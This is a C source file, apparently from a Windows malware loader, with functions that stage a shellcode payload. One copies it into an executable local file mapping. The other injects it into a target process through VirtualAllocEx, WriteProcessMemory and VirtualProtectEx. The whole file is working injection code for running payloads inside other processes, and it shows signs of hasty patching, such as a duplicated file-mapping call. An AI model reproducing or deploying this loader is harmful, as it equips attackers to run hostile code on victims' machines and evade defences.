#include "payload_loading.h"

#pragma comment (lib, "OneCore.lib")


BOOL  WritePayloadViaLocalFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* pAddress) {
	BOOL		bSTATE			= TRUE;
	HANDLE		hFile			= NULL;
	PVOID		pMapAddress		= NULL;


	// create a file mapping handle with `RWX` memory permissions
	// this doesnt have to allocated `RWX` view of file unless it is specified in the MapViewOfFile call  
	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sPayloadSize, NULL);
	if (hFile == NULL) {
		DebugPrint("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// maps the view of the payload to the memory 
	// FILE_MAP_WRITE | FILE_MAP_EXECUTE are the permissions of the file (payload) - 
	// since we need to write (copy) then execute the payload
	pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, sPayloadSize);
	if (pMapAddress == NULL) {
		DebugPrint("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	

	DebugPrint("[i] pMapAddress : 0x%p \n", pMapAddress);

	DebugPrint("[i] Copying Payload To 0x%p ...\n", pMapAddress);
	_memcpy(pMapAddress, pPayload, sPayloadSize);
	DebugPrint("[+] DONE \n");
	
	
_EndOfFunction:
	*pAddress = pMapAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}

//TODO choose the target process
BOOL  WritePayloadViaRemoteFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* pAddress, IN HANDLE hProcess) {
    DWORD		dwProcessId		    = 0;
	BOOL		bSTATE				= TRUE;
	HANDLE		hFile				= NULL;
	PVOID		pMapLocalAddress	= NULL,
				pMapRemoteAddress	= NULL;
    
    DebugPrint("[i] Found Target Process Pid: %d \n", GetProcessId(hProcess));

	// create a file mapping handle with `RWX` memory permissions
	// this doesnt have to allocated `RWX` view of file unless it is specified in the MapViewOfFile/2 call  
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sPayloadSize, NULL);
	if (hFile == NULL) {
		DebugPrint("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// maps the view of the payload to the memory 
	// FILE_MAP_WRITE are the permissions of the file (payload) - 
	// since we only neet to write (copy) the payload to it
	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, 0, 0, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		DebugPrint("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	DebugPrint("\t[+] Local Mapping Address : 0x%p \n", pMapLocalAddress);

	DebugPrint("\t[i] Copying Payload To 0x%p ...\n", pMapLocalAddress);
	_memcpy(pMapLocalAddress, pPayload, sPayloadSize);
	DebugPrint("[+] DONE \n");

	// maps the payload to a new remote buffer (in the target process)
	// it is possible here to change the memory permissions to `RWX`
	/*MapViewOfFile2_t pMapViewOfFile2 = (MapViewOfFile2_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "MapViewOfFile2");
	pMapRemoteAddress = pMapViewOfFile2(hFile, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);
	if (pMapRemoteAddress == NULL) {
		DebugPrint("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	DebugPrint("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);

_EndOfFunction:
	*pAddress = pMapRemoteAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;*/

	// Create a file mapping handle with RWX permissions
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sPayloadSize, NULL);
	if (hFile == NULL) {
		DebugPrint("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Map the view into the local process
	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, 0, 0, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		DebugPrint("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	DebugPrint("[i] Local Mapping Address : 0x%p \n", pMapLocalAddress);

	// Copy payload into the local mapped view
	DebugPrint("[i] Copying Payload To Local Address 0x%p ...\n", pMapLocalAddress);
	_memcpy(pMapLocalAddress, pPayload, sPayloadSize);
	DebugPrint("[+] DONE \n");

	// Allocate memory in the remote process
	pMapRemoteAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pMapRemoteAddress == NULL) {
		DebugPrint("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	DebugPrint("[i] Remote Allocation Address : 0x%p \n", pMapRemoteAddress);

	// Write the payload from local mapping to remote memory
	SIZE_T bytesWritten = 0;
	if (!WriteProcessMemory(hProcess, pMapRemoteAddress, pMapLocalAddress, sPayloadSize, &bytesWritten) || bytesWritten != sPayloadSize) {
		DebugPrint("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	DebugPrint("[+] Payload Written To Remote Process At 0x%p \n", pMapRemoteAddress);

	// Optional: Change memory permissions in the remote process
	DWORD oldProtect;
	if (!VirtualProtectEx(hProcess, pMapRemoteAddress, sPayloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
		DebugPrint("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	DebugPrint("[+] Remote Memory Permissions Changed To PAGE_EXECUTE_READ \n");

_EndOfFunction:
	if (pMapLocalAddress) {
		UnmapViewOfFile(pMapLocalAddress);
	}
	if (hFile) {
		CloseHandle(hFile);
	}
	*pAddress = pMapRemoteAddress;
	return bSTATE;
}
